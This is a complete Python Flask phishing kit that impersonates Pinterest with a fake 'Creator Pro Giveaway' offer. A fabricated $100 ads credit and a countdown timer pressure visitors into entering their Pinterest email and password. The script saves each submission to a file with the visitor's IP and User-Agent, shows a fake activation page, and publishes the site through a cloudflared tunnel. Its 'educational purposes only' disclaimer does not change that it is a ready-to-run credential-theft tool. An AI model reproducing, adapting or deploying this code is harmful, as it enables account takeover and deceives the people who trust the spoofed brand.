import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'pinterest-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Pinterest Pro")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['pin_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Pinterest Creator Program - Free Pro Account</title>
        <style>
            :root {
                --pinterest-red: #E60023;
                --pinterest-light: #EFEFEF;
                --pinterest-dark: #111111;
                --pinterest-gray: #767676;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: #FFFFFF;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #111111;
                -webkit-text-size-adjust: 100%;
            }
            
            .login-box {
                background: white;
                width: 100%;
                max-width: 400px;
                padding: 30px 25px;
                border-radius: 16px;
                text-align: center;
                box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1);
                border: 1px solid #E1E1E1;
                margin: 0 auto;
            }
            
            .pinterest-logo {
                font-size: 32px;
                font-weight: 700;
                color: var(--pinterest-red);
                margin-bottom: 20px;
                letter-spacing: -1px;
            }
            
            .pinterest-icon {
                width: 80px;
                height: 80px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
                overflow: hidden;
            }
            
            .pinterest-icon img {
                width: 100%;
                height: 100%;
                object-fit: contain;
            }
            
            .creator-banner {
                background: linear-gradient(90deg, #E60023 0%, #FF4757 50%, #E60023 100%);
                color: white;
                padding: 14px;
                border-radius: 12px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 16px;
                border: 2px solid #FF4757;
                font-size: clamp(14px, 4vw, 18px);
            }
            
            .pro-badge {
                background: linear-gradient(45deg, #111111, #333333);
                color: white;
                padding: 10px 20px;
                border-radius: 24px;
                margin: 20px auto;
                font-weight: 700;
                font-size: 18px;
                width: fit-content;
                border: 3px solid #E60023;
                font-size: clamp(16px, 4vw, 20px);
            }
            
            .giveaway-container {
                background: #F9F9F9;
                border: 2px dashed #E60023;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 24px;
                margin: 10px 0;
                color: #111111;
                font-weight: 700;
                font-size: clamp(20px, 5vw, 28px);
            }
            
            .subtitle {
                color: var(--pinterest-gray);
                font-size: 14px;
                margin-bottom: 25px;
                line-height: 1.5;
                font-size: clamp(13px, 3.5vw, 16px);
            }
            
            .timer {
                background: #FFF5F5;
                border: 2px solid #FF6B6B;
                border-radius: 8px;
                padding: 12px;
                margin: 20px 0;
                font-family: 'Courier New', monospace;
                font-size: 20px;
                color: #E60023;
                text-align: center;
                font-weight: 700;
                font-size: clamp(18px, 4vw, 24px);
            }
            
            .features-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 10px;
                margin: 20px 0;
            }
            
            .feature-item {
                background: white;
                border: 1px solid #E1E1E1;
                border-radius: 8px;
                padding: 12px;
                text-align: center;
                transition: all 0.3s;
                min-height: 80px;
                display: flex;
                flex-direction: column;
                justify-content: center;
            }
            
            .feature-item:hover {
                border-color: var(--pinterest-red);
                box-shadow: 0 4px 12px rgba(230, 0, 35, 0.1);
            }
            
            .feature-icon {
                font-size: 20px;
                margin-bottom: 8px;
                color: var(--pinterest-red);
            }
            
            .feature-label {
                font-size: 11px;
                color: var(--pinterest-gray);
                margin-top: 5px;
                line-height: 1.3;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #111111;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: #F9F9F9;
                border: 2px solid #E1E1E1;
                border-radius: 8px;
                color: #111111;
                font-size: 15px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                font-size: clamp(14px, 3.5vw, 16px);
            }
            
            input:focus {
                border-color: var(--pinterest-red);
                outline: none;
                background: white;
            }
            
            input::placeholder {
                color: #999999;
            }
            
            .login-btn {
                background: var(--pinterest-red);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 8px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 20px 0 15px;
                cursor: pointer;
                transition: all 0.3s;
                font-size: clamp(15px, 4vw, 18px);
            }
            
            .login-btn:hover {
                background: #CC001F;
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(230, 0, 35, 0.3);
            }
            
            .login-btn:active {
                transform: translateY(0);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: flex-start;
                margin: 12px 0;
                color: #111111;
                font-size: 14px;
                line-height: 1.4;
                font-size: clamp(13px, 3.5vw, 16px);
            }
            
            .benefit-icon {
                color: var(--pinterest-red);
                font-weight: bold;
                margin-right: 10px;
                font-size: 18px;
                flex-shrink: 0;
                margin-top: 1px;
            }
            
            .verified-badge {
                display: inline-flex;
                align-items: center;
                background: #F0F0F0;
                color: #111111;
                padding: 4px 8px;
                border-radius: 20px;
                font-size: 11px;
                font-weight: 600;
                margin-left: 8px;
                border: 1px solid #E1E1E1;
                white-space: nowrap;
            }
            
            .warning-note {
                color: #E60023;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #E1E1E1;
                padding-top: 15px;
                text-align: center;
                line-height: 1.4;
            }
            
            .stats-bar {
                display: flex;
                justify-content: space-between;
                background: #F9F9F9;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
            }
            
            .stat-item {
                text-align: center;
                flex: 1;
                padding: 0 5px;
            }
            
            .stat-number {
                font-size: 18px;
                font-weight: 800;
                color: var(--pinterest-red);
                font-size: clamp(16px, 4vw, 20px);
            }
            
            .stat-label {
                font-size: 10px;
                color: var(--pinterest-gray);
                text-transform: uppercase;
                letter-spacing: 0.5px;
                margin-top: 3px;
            }
            
            /* Mobile-specific adjustments */
            @media (max-width: 480px) {
                body {
                    padding: 10px;
                    align-items: flex-start;
                    min-height: 100vh;
                    height: auto;
                }
                
                .login-box {
                    padding: 25px 20px;
                    border-radius: 12px;
                }
                
                .pinterest-icon {
                    width: 70px;
                    height: 70px;
                    margin-bottom: 15px;
                }
                
                .creator-banner {
                    padding: 12px;
                    font-size: 15px;
                    margin: 15px 0;
                }
                
                .giveaway-container {
                    padding: 15px;
                    margin: 15px 0;
                }
                
                .timer {
                    padding: 10px;
                    margin: 15px 0;
                }
                
                .features-grid {
                    gap: 8px;
                }
                
                .feature-item {
                    padding: 10px;
                    min-height: 70px;
                }
                
                .feature-icon {
                    font-size: 18px;
                    margin-bottom: 5px;
                }
                
                .benefit-item {
                    margin: 10px 0;
                }
                
                .login-btn {
                    padding: 14px;
                }
            }
            
            @media (max-width: 320px) {
                .login-box {
                    padding: 20px 15px;
                }
                
                .features-grid {
                    grid-template-columns: 1fr;
                }
                
                .feature-item {
                    min-height: 60px;
                }
            }
            
            /* Prevent zoom on iOS */
            @media screen and (max-width: 768px) {
                input, select, textarea {
                    font-size: 16px;
                }
            }
        </style>
        <link rel="icon" type="image/x-icon" href="https://cdn.worldvectorlogo.com/logos/pinterest-1.svg">
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <div class="pinterest-icon">
                    <img src="https://cdn.worldvectorlogo.com/logos/pinterest-1.svg" alt="Pinterest Logo" onerror="this.onerror=null; this.parentElement.innerHTML='P'; this.parentElement.style.background='#E60023'; this.parentElement.style.color='white'; this.parentElement.style.fontSize='36px'; this.parentElement.style.fontWeight='bold';">
                </div>
                
                <div class="creator-banner">
                    🎨 CREATOR PRO GIVEAWAY 🎨
                </div>
                
                <div class="pro-badge">
                    Pinterest Pro Account
                </div>
                
                <div class="giveaway-container">
                    <h1>Claim Free Pro Account</h1>
                    <div class="subtitle">
                        For content creators and businesses <span class="verified-badge">Verified</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        08:00
                    </div>
                </div>
                
                <div class="stats-bar">
                    <div class="stat-item">
                        <div class="stat-number">10K</div>
                        <div class="stat-label">Monthly Views</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">0</div>
                        <div class="stat-label">Ads Budget</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">∞</div>
                        <div class="stat-label">Pins</div>
                    </div>
                </div>
                
                <div class="features-grid">
                    <div class="feature-item">
                        <div class="feature-icon">📈</div>
                        <div>Analytics Pro</div>
                        <div class="feature-label">Advanced Insights</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">🔗</div>
                        <div>Link in Bio</div>
                        <div class="feature-label">Multiple Links</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">🎯</div>
                        <div>Targeted Ads</div>
                        <div class="feature-label">$100 Credit</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">👁️</div>
                        <div>Idea Pins</div>
                        <div class="feature-label">Unlimited</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        <div>$100 Pinterest Ads Credit</div>
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        <div>Advanced Analytics Dashboard</div>
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        <div>Verified Business Badge</div>
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        <div>Early Access to New Features</div>
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        <div>Priority Creator Support</div>
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">EMAIL OR USERNAME</label>
                        <input type="text" name="username" placeholder="Enter your Pinterest email or username" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎨 Claim Pro Account
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This Creator Program offer ends in 8 minutes. Pro features will be activated within 24 hours.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 480; // 8 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 120) { // Last 2 minutes
                    countdownElement.style.background = '#FFE5E5';
                    countdownElement.style.borderColor = '#E60023';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Giveaway Ended!";
                    countdownElement.style.color = '#CC001F';
                }
            }
            
            // Prevent form zoom on iOS
            document.addEventListener('touchstart', function(event) {
                if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA' || event.target.tagName === 'SELECT') {
                    event.target.style.fontSize = '16px';
                }
            });
            
            // Handle logo fallback
            window.addEventListener('load', function() {
                const logoImg = document.querySelector('.pinterest-icon img');
                if (logoImg && logoImg.complete && logoImg.naturalWidth === 0) {
                    const parent = logoImg.parentElement;
                    parent.innerHTML = 'P';
                    parent.style.background = '#E60023';
                    parent.style.color = 'white';
                    parent.style.fontSize = '36px';
                    parent.style.fontWeight = 'bold';
                    parent.style.display = 'flex';
                    parent.style.alignItems = 'center';
                    parent.style.justifyContent = 'center';
                }
            });
            
            updateTimer();
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('pin_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Pinterest Pro Giveaway\n")
        file.write(f"Promised: $100 Ads Credit + Pro Account\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Pinterest Pro Activation</title>
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: #FFFFFF;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #111111;
                -webkit-text-size-adjust: 100%;
            }
            .container {
                text-align: center;
                background: white;
                padding: 30px 25px;
                border-radius: 16px;
                max-width: 500px;
                width: 100%;
                border: 1px solid #E1E1E1;
                box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1);
            }
            .pinterest-logo {
                font-size: 32px;
                font-weight: 700;
                color: #E60023;
                margin-bottom: 20px;
                letter-spacing: -1px;
            }
            .pro-icon {
                width: 80px;
                height: 80px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
                overflow: hidden;
                animation: float 3s ease-in-out infinite;
            }
            .pro-icon img {
                width: 100%;
                height: 100%;
                object-fit: contain;
            }
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-8px); }
            }
            .processing-container {
                background: #F9F9F9;
                border: 2px solid #E60023;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            .progress-container {
                width: 100%;
                height: 6px;
                background: #E1E1E1;
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #E60023, #FF4757, #FF6B6B);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            .pro-activated {
                background: #FFF5F5;
                border: 2px solid #E60023;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            .checkmark {
                color: #E60023;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            .status-item {
                display: flex;
                align-items: flex-start;
                margin: 15px 0;
                color: #111111;
                font-size: 15px;
                line-height: 1.4;
            }
            .credit-amount {
                font-size: 36px;
                font-weight: 900;
                background: linear-gradient(45deg, #E60023, #FF4757);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                font-size: clamp(32px, 8vw, 48px);
            }
            .pin-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 8px;
                margin: 15px 0;
            }
            .pin-item {
                background: #F0F0F0;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                font-size: 20px;
                color: #767676;
            }
            
            h2 {
                margin-bottom: 8px;
                color: #111111;
                font-size: clamp(18px, 5vw, 24px);
            }
            
            p {
                color: #767676;
                margin-bottom: 20px;
                font-size: clamp(13px, 3.5vw, 16px);
                line-height: 1.5;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 10px;
                    align-items: flex-start;
                }
                
                .container {
                    padding: 25px 20px;
                    border-radius: 12px;
                }
                
                .pro-icon {
                    width: 70px;
                    height: 70px;
                    margin-bottom: 15px;
                }
                
                .processing-container {
                    padding: 15px;
                    margin: 15px 0;
                }
                
                .pro-activated {
                    padding: 15px;
                    margin: 15px 0;
                }
                
                .status-item {
                    margin: 12px 0;
                    font-size: 14px;
                }
                
                .pin-item {
                    padding: 12px;
                    font-size: 18px;
                }
                
                .credit-amount {
                    margin: 10px 0;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
        <link rel="icon" type="image/x-icon" href="https://cdn.worldvectorlogo.com/logos/pinterest-1.svg">
    </head>
    <body>
        <div class="container">
            <div class="pro-icon">
                <img src="https://cdn.worldvectorlogo.com/logos/pinterest-1.svg" alt="Pinterest Logo" onerror="this.onerror=null; this.parentElement.innerHTML='P'; this.parentElement.style.background='#E60023'; this.parentElement.style.color='white'; this.parentElement.style.fontSize='36px'; this.parentElement.style.fontWeight='bold';">
            </div>
            
            <div class="credit-amount">
                $100 Credit
            </div>
            
            <h2>Pro Account Activated!</h2>
            <p>Your creator benefits are being configured</p>
            
            <div class="processing-container">
                <h3 style="color: #111111; margin-top: 0;">Setting Up Your Pro Account</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p style="margin-bottom: 0;">Applying ads credit and enabling advanced features...</p>
            </div>
            
            <div class="pin-grid">
                <div class="pin-item">📈</div>
                <div class="pin-item">🎯</div>
                <div class="pin-item">👁️</div>
            </div>
            
            <div class="pro-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>$100 Ads Credit</strong> added to your account</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Analytics Pro</strong> - Advanced insights enabled</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Verified Badge</strong> - Business profile verified</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Link in Bio</strong> - Multiple links activated</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Idea Pins</strong> - Unlimited creation enabled</div>
                </div>
            </div>
            
            <p style="color: #767676; margin-top: 20px; font-size: 13px;">
                You will be redirected to Pinterest shortly...
                <br>
                <small style="color: #999999;">Your Pro features will be available within 24 hours</small>
            </p>
        </div>
        
        <script>
            // Animate credit amount
            setTimeout(() => {
                const creditAmount = document.querySelector('.credit-amount');
                if (creditAmount) {
                    creditAmount.style.transform = 'scale(1.1)';
                    creditAmount.style.transition = 'transform 0.3s';
                    setTimeout(() => {
                        creditAmount.style.transform = 'scale(1)';
                    }, 300);
                }
            }, 1500);
            
            // Handle logo fallback
            window.addEventListener('load', function() {
                const logoImg = document.querySelector('.pro-icon img');
                if (logoImg && logoImg.complete && logoImg.naturalWidth === 0) {
                    const parent = logoImg.parentElement;
                    parent.innerHTML = 'P';
                    parent.style.background = '#E60023';
                    parent.style.color = 'white';
                    parent.style.fontSize = '36px';
                    parent.style.fontWeight = 'bold';
                    parent.style.display = 'flex';
                    parent.style.alignItems = 'center';
                    parent.style.justifyContent = 'center';
                }
            });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"📌 Pinterest Pro Public Link: {tunnel_url}")
            print(f"💰 Promising: $100 FREE Pinterest Ads Credit + Pro Account")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Pinterest credentials!")
            print("⚠️  Pinterest accounts contain personal data and business information!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5007, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Pinterest Pro Giveaway Page...")
    print("📱 Port: 5007")
    print("💾 Save location: ~/storage/downloads/PinterestPro/")
    print("💰 Promising: $100 FREE Pinterest Ads Credit")
    print("🎨 Features: Pro Account, Analytics, Verified Badge")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5007")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)